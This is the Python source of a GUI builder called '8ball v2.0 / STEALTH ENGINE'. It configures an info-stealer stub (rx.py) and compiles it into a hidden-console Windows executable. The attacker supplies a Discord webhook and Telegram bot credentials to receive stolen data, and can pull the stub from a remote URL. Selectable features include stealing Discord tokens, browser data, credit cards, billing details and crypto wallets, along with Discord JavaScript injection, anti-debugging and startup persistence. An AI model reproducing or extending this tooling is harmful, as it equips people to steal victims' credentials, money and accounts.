import os
import shutil
import webbrowser
import random
import re
import subprocess
import urllib.request
from tkinter import filedialog, messagebox
import customtkinter as ctk
from tkinter import ttk
# --- INITIAL SETUP ---
PROJECT_DIR = "Build_Project"
FILE_NAME = 'rx.py'
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue") 

if not os.path.exists(PROJECT_DIR):
    os.makedirs(PROJECT_DIR)
if os.path.exists(FILE_NAME) and not os.path.exists(os.path.join(PROJECT_DIR, FILE_NAME)):
    shutil.move(FILE_NAME, os.path.join(PROJECT_DIR, FILE_NAME))
os.chdir(PROJECT_DIR)

# --- THEME COLORS ---
LOGOCOLOR = "#ffffff"
BG_COLOR = "#16161d"
SIDEBAR_COLOR = "#16161d"
ACCENT_BLUE = "#797979"
TEXT_SUB = "#c3c4c5"
GENBUTTON_COLOR = "#FDFDFD"
STATUS = "#00ffaa"
# --- FUNCTIONS ---
def download_online_stub():
    """Download rx.py from SRC_URL in the local rx.py, if set."""
    try:
        with open(FILE_NAME, 'r', encoding='utf-8') as f:
            src = f.read()
        m = re.search(r'^SRC_URL\s*=\s*"([^"]*)"', src, re.MULTILINE)
        if not m or not m.group(1):
            return True
        url = m.group(1)
        print(f"[RX Builder] Fetching stub from: {url}")
        resp = urllib.request.urlopen(url, timeout=30)
        new_src = resp.read().decode('utf-8')
        with open(FILE_NAME, 'w', encoding='utf-8') as f:
            f.write(new_src)
        print("[RX Builder] Stub downloaded successfully.")
        return True
    except Exception as e:
        messagebox.showerror("Download Error", f"Failed to download stub:\n{e}")
        return False
def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    if not os.path.exists(FILE_NAME):
        messagebox.showerror("Error", f"{FILE_NAME} not found!")
        return False

    with open(FILE_NAME, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    with open(FILE_NAME, 'w', encoding='utf-8') as file:
        for line in lines:
            if line.strip().startswith('h00k ='):
                indent = ' ' * (len(line) - len(line.lstrip()))
                file.write(f'{indent}h00k = "{webhook}"\n')
            else:
                file.write(line)
    return True

def update_feature_config_string(key: str, value) -> bool:
    """Update a single string config value in FEATURE_CONFIG dict in rx.py."""
    if not os.path.exists(FILE_NAME):
        messagebox.showerror("Error", f"{FILE_NAME} not found!")
        return False

    with open(FILE_NAME, "r", encoding="utf-8") as f:
        src = f.read()

    # Find the key inside FEATURE_CONFIG = { ... }
    pattern = rf'("{key}"):\s*"[^"]*"'
    replacement = rf'\1: "{value}"'
    new_src = re.sub(pattern, replacement, src)

    if new_src == src:
        # Key not found; try adding it before the closing brace
        marker = "FEATURE_CONFIG = {"
        start = src.find(marker)
        if start == -1:
            messagebox.showerror("Error", "FEATURE_CONFIG block not found.")
            return False
        end = src.find("}", start)
        if end == -1:
            messagebox.showerror("Error", "Malformed FEATURE_CONFIG block.")
            return False
        new_src = src[:end] + f'    "{key}": "{value}",\n' + src[end:]

    with open(FILE_NAME, "w", encoding="utf-8") as f:
        f.write(new_src)
    return True


def update_feature_config(selected_features: list[str]) -> bool:
    """
    Update FEATURE_CONFIG in rx.py based on selected GUI features.
    """
    if not os.path.exists(FILE_NAME):
        messagebox.showerror("Error", f"{FILE_NAME} not found!")
        return False

    # Map GUI labels to FEATURE_CONFIG keys in rx.py
    # IMPORTANT: these labels MUST match the checkbox labels in the GUI (features dict) exactly
    feature_map = {
        "Discord Token Stealer": "discord_tokens",
        "Browser Data Extractor": "browser_data",
        "Local Files": "file_search",
        "Discord JavaScript Injection": "discord_injection",
        "Anti-Debugging/VM": "anti_debug",
        "IP and Location Information": "ip_location_info",
        "Nitro": "nitro_badges_info",
        "User Billing Information": "user_billing_info",
        "Discord Gift Codes": "discord_gift_codes",
        "Crypto Wallet": "wallet_gaming_data",
        "Telegram": "telegram_desktop",
        "Browser Autofill and History": "browser_autofill_history",
        "Browser Bookmarks": "browser_bookmarks",
        "Credit Cards": "browser_credit_cards",
        "Startup Persistence": "startup_persistence",
    }

    # Build a dict of FEATURE_CONFIG booleans
    config = {}
    for label, key in feature_map.items():
        config[key] = label in selected_features

    # Serialize into Python dict literal on one line
    config_literal = "{\n"
    for key, val in config.items():
        config_literal += f'    "{key}": {str(val)},\n'
    config_literal += "}"

    # Rewrite FEATURE_CONFIG block in rx.py
    with open(FILE_NAME, "r", encoding="utf-8") as f:
        src = f.read()

    # Replace the existing FEATURE_CONFIG = { ... } block.
    # We look for the first occurrence of 'FEATURE_CONFIG = {' and its closing '}'.
    marker = "FEATURE_CONFIG = {"
    start = src.find(marker)
    if start == -1:
        messagebox.showerror("Error", "FEATURE_CONFIG block not found in rx.py.")
        return False

    # Find matching closing '}' from that position
    end = src.find("}", start)
    if end == -1:
        messagebox.showerror("Error", "Malformed FEATURE_CONFIG block in rx.py.")
        return False

    # Replace the whole block
    new_src = src[:start] + f"FEATURE_CONFIG = {config_literal}\n" + src[end + 1 :]

    with open(FILE_NAME, "w", encoding="utf-8") as f:
        f.write(new_src)

    return True

def check_build_done(proc):
    # Poll the process; when it's done, update status
    if proc.poll() is None:
        # still running, check again shortly
        app.after(500, lambda: check_build_done(proc))
    else:
        if proc.returncode == 0:
            status_label.configure(text="STATUS: BUILD FINISHED", text_color="#10b981")
            messagebox.showinfo("Build Finished", "Build completed successfully.")
        else:
            status_label.configure(text="STATUS: BUILD FAILED", text_color="#ef4444")
            messagebox.showerror("Build Failed", f"Build process exited with code {proc.returncode}.")

def build_exe():
    webhook = entry.get()
    if not validate_webhook(webhook):
        messagebox.showerror("Auth Error", "Please provide a valid Discord Webhook.")
        return

    # Ensure at least one feature is selected
    selected_features = [name for name, var in features.items() if var.get()]
    if not selected_features:
        messagebox.showerror(
            "No Features Selected",
            "No features selected.\nBuild aborted."
        )
        return

    print("[RX Builder] Selected features:", ", ".join(selected_features))

    # Download online stub if SRC_URL is set in rx.py
    if not download_online_stub():
        return

    # Update webhook and FEATURE_CONFIG in rx.py before building
    if not replace_webhook(webhook):
        return

    if not update_feature_config(selected_features):
        return

    # Write Telegram and Ping config
    tg_token = tg_entry.get().strip()
    tg_chat = tg_chat_entry.get().strip()
    update_feature_config_string("telegram_bot_token", tg_token)
    update_feature_config_string("telegram_chat_id", tg_chat)
    ping_user_val = ping_var.get()
    with open(FILE_NAME, "r", encoding="utf-8") as f:
        src = f.read()
    pattern = r'("ping_user"):\s*(True|False|"[^"]*")'
    if re.search(pattern, src):
        src = re.sub(pattern, rf'\1: {str(ping_user_val)}', src)
    else:
        marker = "FEATURE_CONFIG = {"
        start = src.find(marker)
        if start != -1:
            end = src.find("}", start)
            if end != -1:
                src = src[:end] + f'    "ping_user": {str(ping_user_val)},\n' + src[end:]
    with open(FILE_NAME, "w", encoding="utf-8") as f:
        f.write(src)

    # Icon option (optional)
    icon_option = ""
    if check_var.get() == "on":
        icon_path = filedialog.askopenfilename(filetypes=[("Icon", "*.ico")])
        if icon_path:
            icon_option = f' --icon="{icon_path}"'

    status_label.configure(text="STATUS: BUILDING...", text_color=STATUS)
    app.update()
# Run pyinstaller in a separate console, close it when done
    cmd = f'pyinstaller --noconsole --onefile --clean --noconfirm{icon_option} {FILE_NAME}'
    try:
        proc = subprocess.Popen(
            ["cmd.exe", "/c", cmd],  # /c = run then close
            creationflags=subprocess.CREATE_NEW_CONSOLE
        )
    except Exception as e:
        messagebox.showerror("Build Error", f"Failed to start build terminal:\n{e}")
        status_label.configure(text="STATUS: ERROR", text_color="#ef4444")
        return

    # Optionally wait for completion and then update status
    app.after(100, lambda: check_build_done(proc))
def open_link(url):
    webbrowser.open(url)

# --- GUI LAYOUT ---
app = ctk.CTk()
app.title("8ball v2.0 | ALPHA")
app.geometry("650x640")
app.configure(fg_color=BG_COLOR)
app.resizable(False, False)

# Set app window icon (app logo)
# Place a file like 'rx_logo.ico' next to this script, or change the filename below.
ICON_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "img\\img.ico")
if os.path.isfile(ICON_PATH):
    try:
        app.iconbitmap(ICON_PATH)
    except Exception:
        # Ignore if platform/ctk backend doesn't support setting icon this way
        pass

# Sidebar Navigation
sidebar = ctk.CTkFrame(app, width=200, corner_radius=0, fg_color=SIDEBAR_COLOR, border_width=0)
sidebar.pack(side="left", fill="y")

logo_label = ctk.CTkLabel(sidebar, text="8ball", font=("Impact", 32), text_color=LOGOCOLOR)
logo_label.pack(pady=(30, 5))
sub_logo = ctk.CTkLabel(sidebar, text="STEALTH ENGINE", font=("Arial Bold", 10), text_color=LOGOCOLOR)
sub_logo.pack(pady=(0, 40))

# Contact Links in Sidebar
ctk.CTkLabel(sidebar, text="PROJECT LINKS", font=("Arial Bold", 11), text_color=LOGOCOLOR).pack(pady=(10, 5))

site_btn = ctk.CTkButton(sidebar, text="Official Site", fg_color="transparent", text_color="white", 
                         hover_color="#1e1e26", anchor="w", command=lambda: open_link('https://guns.lol/ricksanchez./'))
site_btn.pack(fill="x", padx=10, pady=2)

disc_btn = ctk.CTkButton(sidebar, text="Discord Server", fg_color="transparent", text_color="white", 
                         hover_color="#1e1e26", anchor="w", command=lambda: open_link('https://discord.gg/RRssgdghWu'))
disc_btn.pack(fill="x", padx=10, pady=2)


# --- MAIN CONFIGURATION PANEL (NATIVE CTK) ---
tabview = ctk.CTkTabview(
    app, 
    fg_color=BG_COLOR, 
    segmented_button_fg_color=BG_COLOR,
    segmented_button_selected_color="#1e1e26", 
    segmented_button_selected_hover_color="#1e1e26",
    segmented_button_unselected_color=BG_COLOR,
    segmented_button_unselected_hover_color="#16161d",
    text_color="white"
)
tabview.pack(side="right", fill="both", expand=True, padx=10, pady=10)

tabview.add("Main Configuration")
tabview.add("Feature Selection")

content1 = tabview.tab("Main Configuration")
content2 = tabview.tab("Feature Selection")

# Main Configuration Panel Content
title = ctk.CTkLabel(content1, text="Payload Configuration", font=("Arial Bold", 22), text_color="white")
title.pack(anchor="w", pady=(10, 5))
desc = ctk.CTkLabel(content1, text="Target: rx.py | Compile into secure standalone EXE.", font=("Arial", 12), text_color=TEXT_SUB)
desc.pack(anchor="w", pady=(0, 25))

entry_label = ctk.CTkLabel(content1, text="DISCORD WEBHOOK URL", font=("Arial Bold", 11), text_color=ACCENT_BLUE)
entry_label.pack(anchor="w", pady=(10, 5))
entry = ctk.CTkEntry(content1, width=380, height=45, placeholder_text="Paste your webhook here...", 
                     fg_color="#1c1c24", border_color="#2d2d3a", corner_radius=8)
entry.pack(anchor="w")

check_var = ctk.StringVar(value="off")
checkbox = ctk.CTkCheckBox(content1, text="Add Custom Icon (.ico)", variable=check_var, 
                           onvalue="on", offvalue="off", font=("Arial", 12))
checkbox.pack(anchor="w", pady=(25, 5))

# Telegram Bot Token
ctk.CTkLabel(content1, text="TELEGRAM BOT TOKEN (optional)", font=("Arial Bold", 11), text_color=ACCENT_BLUE).pack(anchor="w", pady=(10, 2))
tg_entry = ctk.CTkEntry(content1, width=380, height=35, placeholder_text="Bot token for Telegram alerts...",
                         fg_color="#1c1c24", border_color="#2d2d3a", corner_radius=8)
tg_entry.pack(anchor="w")

# Telegram Chat ID
ctk.CTkLabel(content1, text="TELEGRAM CHAT ID (optional)", font=("Arial Bold", 11), text_color=ACCENT_BLUE).pack(anchor="w", pady=(10, 2))
tg_chat_entry = ctk.CTkEntry(content1, width=380, height=35, placeholder_text="Chat ID for Telegram alerts...",
                             fg_color="#1c1c24", border_color="#2d2d3a", corner_radius=8)
tg_chat_entry.pack(anchor="w")

# Ping All (checkbox)
ping_var = ctk.BooleanVar(value=False)
ping_check = ctk.CTkCheckBox(content1, text="Ping @everyone on each message", variable=ping_var,
                              onvalue=True, offvalue=False, font=("Arial", 12))
ping_check.pack(anchor="w", pady=(20, 5))

btn_frame = ctk.CTkFrame(content1, fg_color="transparent")
btn_frame.pack(fill="x", side="bottom", pady=20)

button = ctk.CTkButton(btn_frame, text="GENERATE PAYLOAD", width=220, height=50, corner_radius=10,
                       font=("Arial Bold", 14), fg_color=ACCENT_BLUE, hover_color="#4AA9F7", command=build_exe)
button.pack(side="left")

status_label = ctk.CTkLabel(btn_frame, text="STATUS: READY", font=("Arial Bold", 10), text_color=TEXT_SUB)
status_label.pack(side="right", padx=10)

# Feature Selection Panel Content with scrollable area
feature_label = ctk.CTkLabel(content2, text="Select Features", font=("Arial Bold", 14), text_color="white")
feature_label.pack(anchor="w", pady=(0, 10))

# Create a scrollable frame inside content2
feature_canvas = ctk.CTkCanvas(content2, bg=BG_COLOR, highlightthickness=0, bd=0)
feature_canvas.pack(fill="both", expand=True, side="left")

feature_scrollbar = ctk.CTkScrollbar(content2, orientation="vertical", command=feature_canvas.yview)
feature_scrollbar.pack(fill="y", side="right")

feature_canvas.configure(yscrollcommand=feature_scrollbar.set)

# Inner frame that holds the checkboxes
feature_inner = ctk.CTkFrame(feature_canvas, fg_color=BG_COLOR)
feature_canvas.create_window((0, 0), window=feature_inner, anchor="nw")

def on_canvas_configure(event):
    feature_canvas.configure(scrollregion=feature_canvas.bbox("all"))

feature_inner.bind("<Configure>", on_canvas_configure)

# Bind mouse wheel to scroll
def _on_mousewheel(event):
    # Windows / Linux style
    feature_canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")

feature_canvas.bind_all("<MouseWheel>", _on_mousewheel)

features = {
    "Discord Token Stealer": ctk.BooleanVar(value=False),
    "Browser Data Extractor": ctk.BooleanVar(value=False),
    "Local Files": ctk.BooleanVar(value=False),
    "Discord JavaScript Injection": ctk.BooleanVar(value=False),
    "Anti-Debugging/VM": ctk.BooleanVar(value=False),
    "IP and Location Information": ctk.BooleanVar(value=False),
    "Nitro": ctk.BooleanVar(value=False),
    "User Billing Information": ctk.BooleanVar(value=False),
    "Discord Gift Codes": ctk.BooleanVar(value=False),
    "Crypto Wallet": ctk.BooleanVar(value=False),     
    "Telegram": ctk.BooleanVar(value=False),
    "Browser Autofill and History": ctk.BooleanVar(value=False),
    "Browser Bookmarks": ctk.BooleanVar(value=False),
    "Credit Cards": ctk.BooleanVar(value=False),
    "Startup Persistence": ctk.BooleanVar(value=False),
}

for feature, var in features.items():
    ctk.CTkCheckBox(
        feature_inner,
        text=feature,
        variable=var,
        onvalue=True,
        offvalue=False,
        font=("Arial", 12)
    ).pack(anchor="w", pady=5)

app.mainloop()